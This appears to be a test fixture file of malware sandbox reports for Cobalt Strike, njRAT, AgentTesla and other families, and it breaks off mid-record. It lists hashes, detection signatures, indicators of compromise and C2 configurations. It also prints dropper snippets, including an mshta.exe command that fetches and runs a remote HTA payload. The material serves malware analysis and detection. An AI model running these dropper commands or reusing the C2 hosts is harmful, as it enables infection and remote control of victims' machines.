            "pick": "unpack001/�",
            "score": 1,
            "sha1": "1095bd4b63360fc2968d75622aa745e5523428ab",
            "sha256": "56b2d516376328129132b815e22379ae8e7176825f059c9374a33cc844482e64",
            "sha512": "1c00ed5d8568f6ebd119524b61573cfe71ca828bd8fbdd150158ec8b5db65fa0"
            "66908d120d201fce6222707bcb78e0c1151b82fdc1dccf3ada867cb810feb6da",
            "signatures": [],
            "size": 166216,
            "target": "�",
            "tasks": ["behavioral4"],
        },
        {
            "md5": "11c18dbf352d81c9532a8ef442151cb1",
            "pick": "unpack001/�",
            "sha1": "fc168555a207eb44b7960e6de96a71d420641d75",
            "sha256": "3c821036b13fff08e2430da457384b131bd56f3539101035d11c0dfa2549807d",
            "sha512": "d802d7953bfa867e7d810e2cf5abac194d0149b714be1b2b90316e28472e1422"
            "316ed116087ceed26ed3ac0377a53d600a4d909a43d68b8bd7d1db8fb9b428fa",
            "signatures": [],
            "size": 164352,
            "target": "�",
            "tasks": "null",
        },
    ],
    "tasks": {
        "211118-a13draede7-behavioral1": {
            "backend": "fu1m1",
            "failure": "static1/unpack001/�: Picked file does not exist",
            "kind": "behavioral",
            "name": "behavioral1",
            "pick": "static1/unpack001/�",
            "platform": "windows10_x64",
            "queue_id": 172796,
            "resource": "win10-en-20211104",
            "score": 1,
            "status": "failed",
            "target": "�.exe",
        },
        "211118-a13draede7-behavioral2": {
            "backend": "horse2",
            "failure": "static1/unpack001/�: Picked file does not exist",
            "kind": "behavioral",
            "name": "behavioral2",
            "pick": "static1/unpack001/�",
            "platform": "windows10_x64",
            "queue_id": 172797,
            "resource": "win10-en-20211014",
            "score": 1,
            "status": "failed",
            "target": "�.exe",
        },
        "211118-a13draede7-behavioral3": {
            "backend": "fu1m1",
            "kind": "behavioral",
            "name": "behavioral3",
            "pick": "static1/unpack001/invoice_payment.vbs",
            "platform": "windows10_x64",
            "queue_id": 172798,
            "resource": "win10-en-20211104",
            "score": 10,
            "status": "reported",
            "tags": ["family:asyncrat", "botnet:khalelmybrother", "persistence", "rat"],
            "target": "invoice_payment.vbs",
        },
        "211118-a13draede7-behavioral4": {
            "backend": "horse2",
            "failure": "platform exec: exit status 1: image=C:\\Users\\Admin\\AppData\\Local\\Temp\\'.exe\ncommand=\""
            "C:\\Users\\Admin\\AppData\\Local\\Temp\\'.exe\"\nwdir=C:\\Users\\Admin\\AppData\\Local\\Temp\nPayload er"
            "ror: The %1 application cannot be run in Win32 mode.\n",
            "kind": "behavioral",
            "name": "behavioral4",
            "pick": "static1/unpack001/'",
            "platform": "windows10_x64",
            "queue_id": 172799,
            "resource": "win10-en-20211014",
            "score": 1,
            "status": "failed",
            "target": "'.exe",
        },
        "211118-a13draede7-static1": {
            "kind": "static",
            "name": "static1",
            "status": "reported",
        },
    },
    "version": "0.2.3",
}

query_211202_qfystsbha9 = {
    "analysis": {
        "family": ["cobaltstrike"],
        "score": 10,
        "tags": [
            "family:cobaltstrike",
            "botnet:0",
            "botnet:1580103824",
            "backdoor",
            "trojan",
        ],
    },
    "extracted": [
        {
            "dropper": {
                "language": "xlm4.0",
                "source": '=CALL("shlwapi", "SHCreateThread", "JJJJ", 13424394',
                "urls": None,
            },
            "tasks": ["behavioral1"],
        },
        {
            "config": {
                "attr": {
                    "access_type": 512,
                    "host": "6a2c-91-132-175-60.ngrok.io,/ga.js",
                    "http_header1": "AAAABwAAAAAAAAADAAAABgAAAAZDb29raWUAAAAAA",
                    "http_header2": "AAAACgAAACZDb250ZW50LVR5cGU6IGFwcGxpY2F0a",
                    "http_method1": "GET",
                    "http_method2": "POST",
                    "polling_time": 60000,
                    "port_number": 80,
                    "sc_process32": "%windir%\\syswow64\\rundll32.exe",
                    "sc_process64": "%windir%\\sysnative\\rundll32.exe",
                    "state_machine": "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCn",
                    "unknown1": 4096,
                    "unknown2": "AAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
                    "uri": "/submit.php",
                    "user_agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)",
                    "watermark": "1580103824",
                },
                "botnet": "1580103824",
                "c2": ["http://6a2c-91-132-175-60.ngrok.io:80/ga.js"],
                "family": "cobaltstrike",
                "rule": "CobaltStrike",
            },
            "dumped_file": "memory/1092-58-0x00000000047A0000-0x00000000048FC000-memory.dmp",
            "resource": "behavioral1/memory/1092-58-0x00000000047A0000-0x00000000048FC000-memory.dmp",
            "tasks": ["behavioral1"],
        },
        {
            "dropper": {
                "language": "xlm4.0",
                "source": '=CALL("shlwapi", "SHCreateThread", "JJJJ", 13424',
                "urls": None,
            },
            "tasks": ["behavioral2"],
        },
        {
            "config": {
                "attr": {"watermark": "0"},
                "botnet": "0",
                "family": "cobaltstrike",
                "rule": "CobaltStrike64",
            },
            "dumped_file": "memory/2680-264-0x0000015036A10000-0x0000015036A5E000-memory.dmp",
            "resource": "behavioral2/memory/2680-264-0x0000015036A10000-0x0000015036A5E000-memory.dmp",
            "tasks": ["behavioral2"],
        },
    ],
    "sample": {
        "completed": "2021-12-02T13:15:31Z",
        "created": "2021-12-02T13:12:51Z",
        "id": "211202-qfystsbha9",
        "md5": "e8aa8dcd4f6beb83945f93237f802aae",
        "score": 10,
        "sha1": "864d3a9a935de7eb4eaf2aeda5a72a43d5da0953",
        "sha256": "35bfaa9d4cf990dff1a67c44fb12065dc2a9d2c23b7342951ec9afd47ef70ef6",
        "sha512": "833f43baf1c917f30d1389fadf820ac73e8c8346704d3acf9887a174664311cb"
        "343f53b7c0fca9a1258d09ea2a46c6a45ea94c2"
        "33e84e98c76ef201a6245f566",
        "size": 514953,
        "target": "6065062174425088.zip",
    },
    "targets": [
        {
            "family": ["cobaltstrike"],
            "iocs": {
                "domains": [
                    "6a2c-91-132-175-60.ngrok.io",
                    "www.microsoft.com",
                    "time.windows.com",
                    "sv.symcb.com",
                ],
                "ips": [
                    "8.8.8.8",
                    "3.17.7.232",
                    "20.101.57.9",
                    "72.21.91.29",
                    "23.52.27.27",
                ],
                "urls": [
                    "http://6a2c-91-132-175-60.ngrok.io/ga.js",
                    "https://6a2c-91-132-175-60.ngrok.io/ga.js",
                    "http://sv.symcb.com/sv.crl",
                    "http://6a2c-91-132-175-60.ngrok.io/__utm.gif",
                    "https://6a2c-91-132-175-60.ngrok.io/__utm.gif",
                ],
            },
            "md5": "513cf6eccb0d244d49d75cfc3c0e8bc8",
            "pick": "unpack001/a08c334b4787086ae997c05f7077e4c6955fd5cc8a141e58d1534fe0683fc44f",
            "score": 10,
            "sha1": "947c26ca2c3ace7a8a1e013469d18c00f81ddc78",
            "sha256": "a08c334b4787086ae997c05f7077e4c6955fd5cc8a141e58d1534fe0683fc44f",
            "sha512": "274e086db431aea4fe41c94a59e56b4f62126113543afd7237cfe9793df3ba4bee393055df7a7b2e2dd18c0232e"
            "ab58956a3a6a1adf5c3f4f5cfb968ae77f92b",
            "signatures": [
                {
                    "desc": "Detected malicious payload which is part of Cobaltstrike.",
                    "label": "cobaltstrike",
                    "name": "Cobaltstrike",
                    "score": 10,
                    "tags": ["trojan", "backdoor", "family:cobaltstrike"],
                },
                {
                    "desc": "Processor information is often read in order to detect sandboxing environments.",
                    "label": "reg_hw_processor",
                    "name": "Checks processor information in registry",
                    "ttp": ["T1012", "T1082"],
                },
                {
                    "label": "reg_hw_system",
                    "name": "Enumerates system info in registry",
                    "ttp": ["T1012", "T1082"],
                },
                {
                    "label": "modifies_iexplore_settings",
                    "name": "Modifies Internet Explorer settings",
                    "tags": ["adware", "spyware"],
                    "ttp": ["T1112"],
                },
                {"label": "reg_software_classes", "name": "Modifies registry class"},
                {"name": "Suspicious behavior: AddClipboardFormatListener"},
                {"name": "Suspicious use of SetWindowsHookEx"},
            ],
            "size": 979968,
            "tags": [
                "family:cobaltstrike",
                "botnet:1580103824",
                "backdoor",
                "trojan",
                "botnet:0",
            ],
            "target": "a08c334b4787086ae997c05f7077e4c6955fd5cc8a141e58d1534fe0683fc44f",
            "tasks": ["behavioral1", "behavioral2"],
        }
    ],
    "version": "0.2.3",
}

query_211220_hdgsjaafbq = {
    "analysis": {
        "family": ["njrat"],
        "score": 10,
        "tags": ["family:njrat", "botnet:hacked", "evasion", "suricata", "trojan"],
    },
    "extracted": [
        {
            "config": {
                "attr": {
                    "reg_key": "54d823e4dec41df2d9207ed10cdce4f6",
                    "splitter": "|'|'|",
                },
                "botnet": "HacKed",
                "c2": ["OC50Y3Aubmdyb2suaW8Strik:MTQ3Mjk="],
                "family": "njrat",
                "mutex": ["54d823e4dec41df2d9207ed10cdce4f6"],
                "rule": "Njrat",
                "version": "0.7d",
            },
            "dumped_file": "sample",
            "resource": "sample",
            "tasks": ["static1", "behavioral1", "behavioral2"],
        }
    ],
    "sample": {
        "completed": "2021-12-20T06:39:39Z",
        "created": "2021-12-20T06:37:04Z",
        "id": "211220-hdgsjaafbq",
        "md5": "ab71d3024ba35c9025ead27b28c075bd",
        "score": 10,
        "sha1": "67a1c777aa8dc845de80ac5da0c26088bccbf838",
        "sha256": "707fef4235cf1842dd9090a412f0b986d5901e5a7728c89804eebdaad40c2468",
        "sha512": "cf3f96595170102d21b597d2cbb692844c960ec3ed8acdc3b37e5421cd4dc26c"
        "ab2c3e903773f2ffa03c443fec06f3d18520d4b2fd0fa3d8c8eb7ef2fe9febaf",
        "size": 95232,
        "target": "ab71d3024ba35c9025ead27b28c075bd.exe",
    },
    "signatures": [
        {"name": "Njrat family", "score": 10, "tags": ["family:njrat"]},
        {
            "desc": "Widely used RAT written in .NET.",
            "label": "njrat",
            "name": "njRAT/Bladabindi",
            "score": 10,
            "tags": ["trojan", "family:njrat"],
        },
        {
            "desc": "suricata: ET MALWARE Generic njRAT/Bladabindi CnC Activity (ll)",
            "label": "suricata_2033132",
            "name": "suricata: ET MALWARE Generic njRAT/Bladabindi CnC Activity (ll)",
            "score": 10,
            "tags": ["suricata"],
        },
        {"name": "Executes dropped EXE", "score": 8},
        {
            "label": "modifies_windows_firewall",
            "name": "Modifies Windows Firewall",
            "score": 8,
            "tags": ["evasion"],
            "ttp": ["T1031"],
        },
        {"label": "fw_startup_file", "name": "Drops startup file", "score": 7},
        {"name": "Loads dropped DLL", "score": 7},
        {
            "desc": "Attempts to interact with connected storage/optical drive(s). Likely ransomware behaviour.",
            "label": "file_antivm_ide_drive",
            "name": "Enumerates physical storage devices",
            "score": 3,
            "ttp": ["T1082"],
        },
        {"name": "Suspicious behavior: GetForegroundWindowSpam"},
        {"name": "Suspicious use of AdjustPrivilegeToken"},
        {"name": "Suspicious use of WriteProcessMemory"},
    ],
    "targets": [
        {
            "family": ["njrat"],
            "iocs": {
                "domains": ["8.tcp.ngrok.io", "time.windows.com"],
                "ips": [
                    "8.8.8.8",
                    "3.142.129.56",
                    "3.19.130.43",
                    "52.109.8.19",
                    "20.101.57.9",
                    "3.142.81.166",
                ],
            },
            "md5": "ab71d3024ba35c9025ead27b28c075bd",
            "score": 10,
            "sha1": "67a1c777aa8dc845de80ac5da0c26088bccbf838",
            "sha256": "707fef4235cf1842dd9090a412f0b986d5901e5a7728c89804eebdaad40c2468",
            "sha512": "cf3f96595170102d21b597d2cbb692844c960ec3ed8acdc3b37e5421cd4dc26c"
            "ab2c3e903773f2ffa03c443fec06f3d18520d4b2fd0fa3d8c8eb7ef2fe9febaf",
            "signatures": [
                {
                    "desc": "Widely used RAT written in .NET.",
                    "label": "njrat",
                    "name": "njRAT/Bladabindi",
                    "score": 10,
                    "tags": ["trojan", "family:njrat"],
                },
                {
                    "desc": "suricata: ET MALWARE Generic njRAT/Bladabindi CnC Activity (ll)",
                    "label": "suricata_2033132",
                    "name": "suricata: ET MALWARE Generic njRAT/Bladabindi CnC Activity (ll)",
                    "score": 10,
                    "tags": ["suricata"],
                },
                {"name": "Executes dropped EXE", "score": 8},
                {
                    "label": "modifies_windows_firewall",
                    "name": "Modifies Windows Firewall",
                    "score": 8,
                    "tags": ["evasion"],
                    "ttp": ["T1031"],
                },
                {"label": "fw_startup_file", "name": "Drops startup file", "score": 7},
                {"name": "Loads dropped DLL", "score": 7},
                {
                    "desc": "Attempts to interact with connected storage/optical drive(s).",
                    "label": "file_antivm_ide_drive",
                    "name": "Enumerates physical storage devices",
                    "score": 3,
                    "ttp": ["T1082"],
                },
                {"name": "Suspicious behavior: GetForegroundWindowSpam"},
                {"name": "Suspicious use of AdjustPrivilegeToken"},
                {"name": "Suspicious use of WriteProcessMemory"},
            ],
            "size": 95232,
            "tags": ["family:njrat", "botnet:hacked", "evasion", "suricata", "trojan"],
            "target": "ab71d3024ba35c9025ead27b28c075bd.exe",
            "tasks": ["behavioral1", "behavioral2"],
        }
    ],
    "tasks": {
        "211220-hdgsjaafbq-behavioral1": {
            "backend": "horse2",
            "kind": "behavioral",
            "name": "behavioral1",
            "platform": "windows7_x64",
            "queue_id": 3638249,
            "resource": "win7-en-20211208",
            "score": 10,
            "status": "reported",
            "tags": ["family:njrat", "botnet:hacked", "evasion", "suricata", "trojan"],
            "target": "ab71d3024ba35c9025ead27b28c075bd.exe",
        },
        "211220-hdgsjaafbq-behavioral2": {
            "backend": "fu1m1",
            "kind": "behavioral",
            "name": "behavioral2",
            "platform": "windows10_x64",
            "queue_id": 3638250,
            "resource": "win10-en-20211208",
            "score": 10,
            "status": "reported",
            "tags": ["family:njrat", "botnet:hacked", "evasion", "suricata", "trojan"],
            "target": "ab71d3024ba35c9025ead27b28c075bd.exe",
        },
        "211220-hdgsjaafbq-static1": {
            "kind": "static",
            "name": "static1",
            "score": 10,
            "status": "reported",
            "tags": ["botnet:hacked", "family:njrat"],
        },
    },
    "version": "0.2.3",
}

query_211228_jjytnscbdn = {
    "analysis": {
        "family": ["agenttesla"],
        "score": 10,
        "tags": [
            "family:agenttesla",
            "collection",
            "keylogger",
            "macro",
            "spyware",
            "stealer",
            "trojan",
        ],
    },
    "extracted": [
        {
            "dropper": {
                "language": "hta",
                "source": '"C:\\Windows\\System32\\mshta.exe" https://bitly.com/ghgfsfdsfdsfadasdqw',
                "urls": [
                    {
                        "type": "hta.dropper",
                        "url": "https://bitly.com/ghgfsfdsfdsfadasdqw",
                    }
                ],
            },
            "tasks": ["behavioral1", "behavioral2"],
        },
        {
            "config": {
                "c2": ["http://microsoftiswear.duckdns.org/y/inc/c3809dbf90d26b.php"],
                "family": "agenttesla",
                "rule": "AgentTeslaV3",
            },
            "dumped_file": "memory/4844-453-0x000000000043767E-mapping.dmp",
            "resource": "behavioral2/memory/4844-453-0x000000000043767E-mapping.dmp",
            "tasks": ["behavioral2"],
        },
    ],
    "sample": {
        "completed": "2021-12-28T07:45:19Z",
        "created": "2021-12-28T07:42:33Z",
        "id": "211228-jjytnscbdn",
        "md5": "0b2df4c0540407d1e553ec10b3bc6c9a",
        "score": 10,
        "sha1": "e85e924e58e0d305f8f4846ce332b1edb252fef8",
        "sha256": "aede7d382658c9bd7b6244ca502b020fc8301a05d253b63897a37aaabab6328a",
        "sha512": "ff54640c41840efb4816ebbfe901d1449fa257158f047da723052789559a0c20"
        "9516b915cce78066f3c4ed17d833af232063d2e542914a4e3500fdd03132c752",
        "size": 57946,
        "target": "aede7d382658c9bd7b6244ca502b020fc8301a05d253b63897a37aaabab6328a",
    },
    "signatures": [
        {
            "desc": "Agent Tesla is a remote access tool (RAT) written in visual basic.",
            "label": "agenttesla",
            "name": "AgentTesla",
            "score": 10,
            "tags": ["keylogger", "trojan", "stealer", "spyware", "family:agenttesla"],
        },
        {
            "desc": "This typically indicates the parent process was compromised via an exploit or macro.",
            "name": "Process spawned unexpected child process",
            "score": 10,
        },
        {
            "indicators": [
                {
                    "resource": "behavioral2/memory/4844-453-0x000000000043767E-mapping.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/4824-454-0x000000000043767E-mapping.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/4932-464-0x000000000043767E-mapping.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/4976-469-0x000000000043767E-mapping.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/4844-478-0x0000000000400000-0x000000000043C000-memory.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/4976-476-0x0000000000400000-0x000000000043C000-memory.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/4844-483-0x0000000000400000-0x000000000043C000-memory.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/4824-477-0x0000000000400000-0x000000000043C000-memory.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/4824-482-0x0000000000400000-0x000000000043C000-memory.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/4976-481-0x0000000000400000-0x000000000043C000-memory.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/5048-479-0x000000000043767E-mapping.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/4932-480-0x0000000000400000-0x000000000043C000-memory.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/4932-475-0x0000000000400000-0x000000000043C000-memory.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/5048-488-0x0000000000400000-0x000000000043C000-memory.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/5084-499-0x0000000000400000-0x000000000043C000-memory.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/5084-500-0x0000000000400000-0x000000000043C000-memory.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/1488-524-0x0000000000400000-0x000000000043C000-memory.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/1488-527-0x0000000000400000-0x000000000043C000-memory.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/4544-582-0x000000000043767E-mapping.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/5048-490-0x0000000000400000-0x000000000043C000-memory.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/4140-619-0x000000000043767E-mapping.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/4468-667-0x000000000043767E-mapping.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/4492-668-0x000000000043767E-mapping.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/4192-750-0x000000000043767E-mapping.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/1964-782-0x000000000043767E-mapping.dmp",
                    "yara_rule": "family_agenttesla",
                },
                {
                    "resource": "behavioral2/memory/4272-804-0x000000000043767E-mapping.dmp",
                    "yara_rule": "family_agenttesla",
                },
            ],
            "name": "AgentTesla Payload",
            "score": 9,
        },
        {"name": "Blocklisted process makes network request", "score": 8},
        {
            "label": "fw_system32_drivers",
            "name": "Drops file in Drivers directory",
            "score": 8,
        },
        {
            "desc": "Office document equipped with macros.",
            "indicators": [{"resource": "sample", "yara_rule": "office_macros"}],
            "name": "Suspicious Office macro",
            "score": 8,
            "tags": ["macro"],
        },
        {
            "label": "access_outlook_profiles",
            "name": "Accesses Microsoft Outlook profiles",
            "score": 6,
            "tags": ["collection"],
            "ttp": ["T1114"],
        },
        {"name": "Suspicious use of SetThreadContext", "score": 5},
        {
            "desc": "Attempts to interact with connected storage/optical drive(s). Likely ransomware behaviour.",
            "label": "file_antivm_ide_drive",
            "name": "Enumerates physical storage devices",
            "score": 3,
            "ttp": ["T1082"],
        },
        {"label": "program_crash", "name": "Program crash", "score": 3},
        {
            "label": "office_macro",
            "name": "Office loads VBA resources, possible macro or embedded object present",
            "score": 1,
        },
        {
            "desc": "Processor information is often read in order to detect sandboxing environments.",
            "label": "reg_hw_processor",
            "name": "Checks processor information in registry",
            "ttp": ["T1012", "T1082"],
        },
        {
            "desc": "Schtasks is often used by malware for persistence or to perform post-infection execution.",
            "label": "schtasks_persist",
            "name": "Creates scheduled task(s)",
            "tags": ["persistence"],
            "ttp": ["T1053"],
        },
        {
            "label": "reg_hw_system",
            "name": "Enumerates system info in registry",
            "ttp": ["T1012", "T1082"],
        },
        {
            "label": "modifies_iexplore_settings",
            "name": "Modifies Internet Explorer settings",
            "tags": ["adware", "spyware"],
            "ttp": ["T1112"],
        },
        {"label": "reg_software_classes", "name": "Modifies registry class"},
        {
            "label": "modifies_certificate_store_registry",
            "name": "Modifies system certificate store",
            "tags": ["evasion", "spyware", "trojan"],
            "ttp": ["T1130", "T1112"],
        },
        {"name": "Suspicious behavior: AddClipboardFormatListener"},
        {"name": "Suspicious behavior: EnumeratesProcesses"},
        {"name": "Suspicious use of AdjustPrivilegeToken"},
        {"name": "Suspicious use of SetWindowsHookEx"},
        {"name": "Suspicious use of WriteProcessMemory"},
        {"label": "outlook_office_path", "name": "outlook_office_path"},
        {"label": "outlook_win_path", "name": "outlook_win_path"},
    ],
    "targets": [
        {
            "family": ["agenttesla"],
            "iocs": {
                "domains": [
                    "bitly.com",
                    "servicemoreoverhttps.blogspot.com",
                    "www.blogger.com",
                    "accounts.google.com",
                    "resources.blogblog.com",
                    "bit.ly",
                    "time.windows.com",
                    "e0e60b79-a4cf-434f-a1f3-9fc2defea271.usrfiles.com",
                    "microsoftiswear.duckdns.org",
                ],
                "ips": [
                    "8.8.8.8",
                    "67.199.248.14",
                    "142.250.179.161",
                    "142.250.179.169",
                    "142.251.36.45",
                    "67.199.248.10",
                    "20.101.57.9",
                    "34.102.176.152",
                    "103.151.122.110",
                ],
                "urls": [
                    "https://bitly.com/ghgfsfdsfdsfadasdqw",
                    "https://servicemoreoverhttps.blogspot.com/p/moreneweronesmores.html",
                    "https://www.blogger.com/static/v1/widgets/1529571102-css_bundle_v2.css",
                    "https://www.blogger.com/static/v1/jsbin/2287435483-ieretrofit.js",
                    "https://www.blogger.com/static/v1/widgets/1434883710-widgets.js",
                    "https://www.blogger.com/dyn-css/authorization.css?targetBlogID=4084127657443813593&zx=e24bd"
                    "7a7-0192-446c-9e2c-8154e3000379",
                    "https://www.blogger.com/blogin.g?blogspotURL=https://servicemoreoverhttps.blogspot.com/p/mo"
                    "reneweronesmores.html&type=blog",
                    "https://www.blogger.com/blogin.g?blogspotURL=https%3A%2F%2Fservicemoreoverhttps.blogspot.co"
                    "m%2Fp%2Fmoreneweronesmores.html&type=blog&bpli=1",
                    "https://accounts.google.com/ServiceLogin?passive=true&continue=https://www.blogger.com/blog"
                    "in.g?blogspotURL%3Dhttps://servicemoreoverhttps.blogspot.com/p/moreneweronesmores.html%26ty"
                    "pe%3Dblog%26bpli%3D1&followup=https://www.blogger.com/blogin.g?blogspotURL%3Dhttps://servic"
                    "emoreoverhttps.blogspot.com/p/moreneweronesmores.html%26type%3Dblog%26bpli%3D1&go=true",
                    "https://resources.blogblog.com/blogblog/data/1kt/simple/body_gradient_tile_light.png",
                    "https://resources.blogblog.com/blogblog/data/1kt/simple/gradients_light.png",
                    "https://bit.ly/3EHfu3v?cc=00c33bb4c2730049983312a3da89d3cf",
                    "https://www.blogger.com/static/v1/v-css/281434096-static_pages.css",
                    "https://www.blogger.com/static/v1/jsbin/3101730221-analytics_autotrack.js",
                    "https://e0e60b79-a4cf-434f-a1f3-9fc2defea271.usrfiles.com/ugd/e0e60b_d494b095c43f489b80d2ee"
                    "6d6acdda35.txt?dn=1239",
                    "https://e0e60b79-a4cf-434f-a1f3-9fc2defea271.usrfiles.com/ugd/e0e60b_d494b095c43f489b80d2ee"
                    "6d6acdda35.txt?dn=2198",
                    "http://microsoftiswear.duckdns.org/y/inc/c3809dbf90d26b.php",
                ],
            },
            "md5": "0b2df4c0540407d1e553ec10b3bc6c9a",
            "score": 10,
            "sha1": "e85e924e58e0d305f8f4846ce332b1edb252fef8",
            "sha256": "aede7d382658c9bd7b6244ca502b020fc8301a05d253b63897a37aaabab6328a",
            "sha512": "ff54640c41840efb4816ebbfe901d1449fa257158f047da723052789559a0c20"
            "9516b915cce78066f3c4ed17d833af232063d2e542914a4e3500fdd03132c752",
            "signatures": [
                {
                    "desc": "Agent Tesla is a remote access tool (RAT) written in visual basic.",
                    "label": "agenttesla",
                    "name": "AgentTesla",
                    "score": 10,
                    "tags": [
                        "keylogger",
                        "trojan",
                        "stealer",
                        "spyware",
                        "family:agenttesla",
                    ],
                },
                {
                    "desc": "This typically indicates the parent process was compromised via an exploit or macro.",
                    "name": "Process spawned unexpected child process",
                    "score": 10,
                },
                {
                    "indicators": [],
                    "name": "AgentTesla Payload",
                    "score": 9,
                },
                {"name": "Blocklisted process makes network request", "score": 8},
                {
                    "label": "fw_system32_drivers",
                    "name": "Drops file in Drivers directory",
                    "score": 8,
                },
                {
                    "label": "access_outlook_profiles",
                    "name": "Accesses Microsoft Outlook profiles",
                    "score": 6,
                    "tags": ["collection"],
                    "ttp": ["T1114"],
                },
                {"name": "Suspicious use of SetThreadContext", "score": 5},
                {
                    "desc": "Attempts to interact with connected storage/optical drive. Likely ransomware behaviour.",
                    "label": "file_antivm_ide_drive",
                    "name": "Enumerates physical storage devices",
                    "score": 3,
                    "ttp": ["T1082"],
                },
                {"label": "program_crash", "name": "Program crash", "score": 3},
                {
                    "label": "office_macro",
                    "name": "Office loads VBA resources, possible macro or embedded object present",
                    "score": 1,
                },
                {
                    "desc": "Processor information is often read in order to detect sandboxing environments.",
                    "label": "reg_hw_processor",
                    "name": "Checks processor information in registry",
                    "ttp": ["T1012", "T1082"],
                },
                {
                    "desc": "Schtasks is often used by malware for persistence or to perform post-inf execution.",
                    "label": "schtasks_persist",
                    "name": "Creates scheduled task(s)",
                    "tags": ["persistence"],
                    "ttp": ["T1053"],
                },
                {
                    "label": "reg_hw_system",
                    "name": "Enumerates system info in registry",
                    "ttp": ["T1012", "T1082"],
                },
                {
                    "label": "modifies_iexplore_settings",
                    "name": "Modifies Internet Explorer settings",
                    "tags": ["adware", "spyware"],
                    "ttp": ["T1112"],
                },
                {"label": "reg_software_classes", "name": "Modifies registry class"},
                {
                    "label": "modifies_certificate_store_registry",
                    "name": "Modifies system certificate store",
                    "tags": ["evasion", "spyware", "trojan"],
                    "ttp": ["T1130", "T1112"],
                },
                {"name": "Suspicious behavior: AddClipboardFormatListener"},
                {"name": "Suspicious behavior: EnumeratesProcesses"},
                {"name": "Suspicious use of AdjustPrivilegeToken"},
                {"name": "Suspicious use of SetWindowsHookEx"},
                {"name": "Suspicious use of WriteProcessMemory"},
                {"label": "outlook_office_path", "name": "outlook_office_path"},
                {"label": "outlook_win_path", "name": "outlook_win_path"},
            ],
            "size": 57946,
            "tags": [
                "family:agenttesla",
                "collection",
                "keylogger",
                "spyware",
                "stealer",
                "trojan",
            ],
            "target": "aede7d382658c9bd7b6244ca502b020fc8301a05d253b63897a37aaabab6328a",
            "tasks": ["behavioral1", "behavioral2"],
        }
    ],
    "tasks": {
        "211228-jjytnscbdn-behavioral1": {
            "backend": "fu1m1",
            "kind": "behavioral",
            "name": "behavioral1",
            "platform": "windows7_x64",
            "queue_id": 3651102,
            "resource": "win7-en-20211208",
            "score": 10,
            "status": "reported",
            "target": "aede7d382658c9bd7b6244ca502b020fc8301a05d253b63897a37aaabab6328a.xlsm",
        },
        "211228-jjytnscbdn-behavioral2": {
            "backend": "horse2",
            "kind": "behavioral",
            "name": "behavioral2",
            "platform": "windows10_x64",
            "queue_id": 3651103,
            "resource": "win10-en-20211208",
            "score": 10,
            "status": "reported",
            "tags": [
                "family:agenttesla",
                "collection",
                "keylogger",
                "spyware",
                "stealer",
                "trojan",
            ],
            "target": "aede7d382658c9bd7b6244ca502b020fc8301a05d253b63897a37aaabab6328a.xlsm",
        },
        "211228-jjytnscbdn-static1": {
            "kind": "static",
            "name": "static1",
            "score": 8,
            "status": "reported",
            "tags": ["macro"],
        },
    },
    "version": "0.2.3",
}

query_230220_tbqs7sah7x = {
    "version": "0.2.3",
    "sample": {
        "id": "230220-tbqs7sah7x",
        "score": 10,
        "target": "9a8dc6c456f0f9e82099d5e392c6e6b2b4818356bbcb63d247d23be9057dea46",
        "size": 1118720,
        "md5": "0975c6819cc2c657b6fb6fcc0cc3fea0",
        "sha1": "5361dbd526a501fc7a7acfdba5b1c4f11e2fddaf",
        "sha256": "9a8dc6c456f0f9e82099d5e392c6e6b2b4818356bbcb63d247d23be9057dea46",
        "sha512": "6fbeefdee3f0158bb32c162ef4bd6622d28d9745061238211fb90fca1e9a75b3"
        "548233b00c607ab180084fabc9989bee74d6b45c6c9ada5a79e23bff6f0c31cd",
        "ssdeep": "24576:DyOv/uT80oe5rUHqWXaQZavFL6pdSVwqyHX7Y/tyAE4mxO6wAh:WOv/uUe5rUfXxWxkdSCvHrr4mxO",
        "created": "2023-02-20T15:53:15Z",
        "completed": "2023-02-20T15:55:49Z",
    },
    "tasks": [
        {
            "sample": "230220-tbqs7sah7x",
            "kind": "behavioral",
            "name": "behavioral1",
            "status": "reported",
            "tags": [
                "family:amadey",
                "family:redline",
                "botnet:fuma",
                "botnet:kk1",
                "botnet:ronam",
                "discovery",
                "evasion",
                "infostealer",
                "persistence",
                "spyware",
                "stealer",
                "trojan",
            ],
            "score": 10,
